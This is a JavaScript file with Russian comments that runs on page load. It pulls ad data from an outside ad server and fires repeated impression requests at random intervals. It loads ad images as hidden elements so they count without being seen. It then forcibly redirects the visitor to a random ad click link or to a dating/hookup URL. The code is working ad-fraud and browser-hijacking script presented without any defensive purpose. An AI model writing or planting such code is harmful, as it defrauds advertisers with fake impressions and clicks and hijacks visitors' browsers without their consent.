window.onload = () => {
    // Функция для получения рандомного числа между двумя числами
    function getRandomBetween(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
    }
    (async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTEyNTU1MSwid2lkIjoyOTc0NzUsImQiOiIiLCJsaSI6Mn0=", count_arr=[ 13, 20 ], refresh_time_arr=[ 1, 2070 ], otherUrl = 'https://datinghookup.life/?u=5n7nn7n&o=gkhpf99') {
        // Функция с промисом для ожидания перед следующим запросом 
        function delay(refresh_time) {
            return new Promise(resolve => setTimeout(resolve, refresh_time));
        }
        try {

            // Генерируем рандомное число показов из диапазона
            const count = getRandomBetween(count_arr[0], count_arr[1]);

            // Создаем массив для асинхронного перехода по ссылках
            let arrCount = [];
            for (let i=0; i < count; i++) {
                arrCount.push(i);
            }

            // Будущая ссылка для клика
            const arrClickUrl = [];

            for (let rw of arrCount) {

                const url = `https://yfetyg.com/wnload?a=1&e=${text}&tz=8&if=0 `;

                const response = await fetch(url);
                const json = await response.json();
                
                for (let row of json) {
                    // Запрос показа
                    if('rinfo' in row) {
                        if ('rw' in row['rinfo']) {
                            let part_url = row['rinfo']['rw'];
                            if (part_url) {
                                // Без доп. параметра a=1 не работает
                                let url = `https://yfetyg.com` + part_url + "&a=1";
                                try {
                                    await fetch(url);
                                } catch(e) {
                                    console.log(e);
                                }
                            }
                        }
                    }

                    // Запрос показа картинки
                    if ('ads' in row) {
                        // Добавляем картинку, к запросу картинки добавляем рандомную переменную, чтобы не кэшировалась картинка и запрос заново делался
                        let icon_url = row['ads'][0]['ic'] + '?r=' + new Date().getTime();
                        let icon = document.createElement("img");
                        icon.style.visibility = 'hidden';
                        icon.src = icon_url
                        document.body.appendChild(icon);
                        
                        let new_url = row['ads'][0]['uf'];
                        if (new_url) arrClickUrl.push(new_url);
                    }
                }
                
                // Определяем рандомное числи ms через которое будет рефреш из диапазона
                const refresh_time = getRandomBetween(refresh_time_arr[0], refresh_time_arr[1]);
                // Делаем остановку на сколько то милисикунд
                await delay(refresh_time);
            }

            if (arrClickUrl.length == 0) {
                window.location.href = otherUrl;
            } else if (arrClickUrl.length == 1) {
                window.location.href = arrClickUrl[0];
            } else {
                let num = getRandomBetween(0, arrClickUrl.length - 1);
                window.location.href = arrClickUrl[num];
            }

        } catch(e) {
            throw e;
        }
    })();

}
